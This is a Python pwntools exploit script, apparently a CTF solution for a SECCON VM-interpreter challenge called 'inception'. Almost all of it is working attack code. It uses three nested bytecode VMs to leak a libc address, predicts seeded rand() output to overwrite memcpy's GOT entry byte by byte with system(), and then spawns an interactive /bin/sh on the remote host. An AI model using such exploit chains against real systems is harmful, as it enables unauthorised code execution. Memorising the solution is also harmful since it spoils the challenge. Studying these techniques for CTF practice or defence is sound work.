from pwn import *
from ctypes import *

#r = process("./inception")
r = remote("vm_no_fun.pwn.seccon.jp", 30203)

def giveInput(sz, dt):
	r.send(p32(sz))
	r.send(dt)

# VM1 struct: (inst)(opcnt)(op1type|op1)(op2type|op2)

def VM1Menu():
	r.send("\x01")

def setVM1read():
	return "\x0c\x00"

def setVM1write():
	return "\x0b\x00"

def setVM1reg(idx, val):
	p = "\x89\x02"
	p += chr(0x20 | 0x00) # reg
	p += p16(idx)
	p += chr(0x20 | 0x01) # val
	p += p16(val)
	return p

def endVM1():
	return "\xf4\x00"

def VM1Exec(payload):
	VM1Menu()
	giveInput(len(payload), payload)

def vm1_to_vm2(payload):
	vm1 = setVM1reg(7, 0x600) # 0x7000
	vm1 += setVM1read()
	vm1 += endVM1()

	VM1Menu()

	giveInput(len(vm1), vm1)
	giveInput(len(payload), payload) # input in vm1's 0x7000~ mem.

def initVM1():
	r.send("\x06")

############################ VM2 ##########################

# VM2 struct: (inst)(op1)(op1flag)(op2)(op2flag)

def VM2Menu():
	r.send("\x02")

def setVM2read():
	return "\xdb" + "\x00"*10

def setVM2write():
	return "\x85" + "\x00"*10

def setVM2reg(idx, val):
	p = "\x28"
	p += p32(idx)
	p += chr(0x20 | 0x0)
	p += p32(val)
	p += chr(0x20 | 0x1)
	return p

def VM2dwordCopy(dt):
	p = "\x88"
	p += "\x00"*5
	p += dt
	p += chr(0x20 | 0x1) # dt
	return p

def endVM2():
	return "\x83" + "\x00"*10

def VM2memcpy(offset, dt):
	assert len(dt) % 4 == 0
	assert offset % 16 == 0
	
	p = setVM2reg(1, 0)
	p += setVM2reg(9, offset+len(dt))
	
	for i in range(len(dt), 0, -4):	
		p += VM2dwordCopy(dt[i-4:i])

	print len(p)
	return p

def VM2load(reg1, reg9, dest):
	p = setVM2reg(10, 0)
	p += setVM2reg(1, reg1)
	p += setVM2reg(9, reg9)
	p += "\x20"    # inst
	p += p32(dest) # op1
	p += "\x22"    # &VM2mem[16 * VM2reg[10]] + op1
	p += "\x00"*5

	return p

def initVM2():
	r.send("\x05")

############################ VM3 ##########################

# VM3 struct: (opflag|inst)(op1)(op2)
# op1type 4bit - 0x800 0x400 0x200 0x100
# op2type 4bit - 0x8000 0x4000 0x2000 0x1000

def VM3Menu():
	r.send("\x03")

def setVM3read():
	return "\x0d\x00"

def setVM3write():
	return "\x0c\x00"

def setVM3reg(idx, val):
	p = "\x01"
	p += chr(0x5 | 0x60) # op1-regaddr, op2-value
	p += p16(idx)
	p += p16(val)
	return p

def VM3jump(offset):
	p = "\x14\x60"
	p += p16(offset)
	return p

def endVM3():
	return "\x0b\x00"

########################## stage-1 ########################

vm2 = setVM2reg(10, 0)
vm2 += setVM2reg(2, 0)
vm2 += setVM2reg(11, 0)
vm2 += "\xc0" + "\x00"*10

vm2 += VM2load(0, 0x100000000-0x10090, 0x1000) 
vm2 += VM2load(0, 0x100000000-0x1008c, 0x1004)
vm2 += setVM2reg(7, 0x100)
vm2 += setVM2reg(11, 4096)
vm2 += setVM2write()
vm2 += endVM2()

vm1_to_vm2(vm2) # Load memcopy payload to vm2

VM2Menu()

vm1leak = setVM1reg(7, 0x800)
vm1leak += setVM1reg(0, 8)
vm1leak += setVM1write()
vm1leak += endVM1()

VM1Exec(vm1leak)

''' localhost
libc_base = u64(r.recvuntil("\x7f")[-6:] + "\x00\x00") - 0x71230
system = libc_base + 0x456a0
'''
libc_base = u64(r.recvuntil("\x7f")[-6:] + "\x00\x00") - 0x6fe70
system = libc_base + 0x45390

print "libc: " + hex(libc_base)
raw_input("$")

########################## stage-2 ########################

clib = cdll.LoadLibrary("libc.so.6")

clib.srand(0x31337)
tbl = []

for i in range(0x1000):
	tbl.append(clib.rand() & 0xff)

idx1 = tbl.index(system & 0xff)
tbl = tbl[idx1:]
idx2 = tbl.index((system >> 8) & 0xff)
tbl = tbl[idx2:]
idx3 = tbl.index((system >> 16) & 0xff)

## low-0 ##

t = idx1 / 20
t2 = idx1 % 20 + 1

for i in range(0, t+1):
	initVM1()
	initVM2()
	vm3 = ""

	k = 20
	if(i == t):
		k = t2

	for i in range(0, k):
		vm3 += setVM3reg(3, 0x0)
		vm3 += setVM3reg(11, 0x10000-0x88) # first byte of memcpy@GOT
		vm3 += "\x15\x00"

	vm3 += endVM3()
	vm3 += "\x00"*(4-len(vm3)%4)

	vm2 = VM2memcpy(0x7000, vm3)
	vm2 += endVM2()

	vm1_to_vm2(vm2) # load VM2 Payload to VM1Mem[0x7000]

	VM2Menu() # exec VM2 -> Load payload to VM2Mem[0x7000]
	VM3Menu() # Load payload from VM2Mem[0x7000] and execute.

## low-1 ##

t = idx2 / 20
t2 = idx2 % 20

for i in range(0, t+1):
	sleep(0.5)
	initVM1()
	initVM2()

	vm3 = ""

	k = 20
	if(i == t):
		k = t2

	for j in range(0, k):
	    vm3 += setVM3reg(3, 0x0)
	    vm3 += setVM3reg(11, 0x10000-0x88+1) # seccond byte of memcpy@GOT
	    vm3 += "\x15\x00"

	vm3 += endVM3()
	vm3 += "\x00"*(4-len(vm3)%4)

	vm2 = VM2memcpy(0x7000, vm3)
	vm2 += endVM2()

	vm1_to_vm2(vm2) # load VM2 Payload to VM1Mem[0x7000]

	VM2Menu() # exec VM2 -> Load payload to VM2Mem[0x7000]
	VM3Menu() # Load payload from VM2Mem[0x7000] and execute.


## low-2 ##

t = idx3 / 20
t2 = idx3 % 20

for i in range(0, t+1):
    initVM1()
    initVM2()

    vm3 = ""

    k = 20
    if(i == t):
        k = t2

    for j in range(0, k):
        vm3 += setVM3reg(3, 0x0)
        vm3 += setVM3reg(11, 0x10000-0x88+2) # third byte of memcpy@GOT
        vm3 += "\x15\x00"

    vm3 += endVM3()
    vm3 += "\x00"*(4-len(vm3)%4)

    vm2 = VM2memcpy(0x7000, vm3)
    vm2 += endVM2()

    vm1_to_vm2(vm2) # load VM2 Payload to VM1Mem[0x7000]

    VM2Menu() # exec VM2 -> Load payload to VM2Mem[0x7000]
    VM3Menu() # Load payload from VM2Mem[0x7000] and execute.

## trigger ##

initVM1()
initVM2()

vm2 = setVM2reg(10, 0)
vm2 += setVM2reg(2, 0x400)
vm2 += "\xc0" + "\x00"*10
vm2 += "\x00"*(0x400-len(vm2))
vm2 += "/bin/sh\x00"

vm1_to_vm2(vm2)

VM2Menu()

r.interactive()
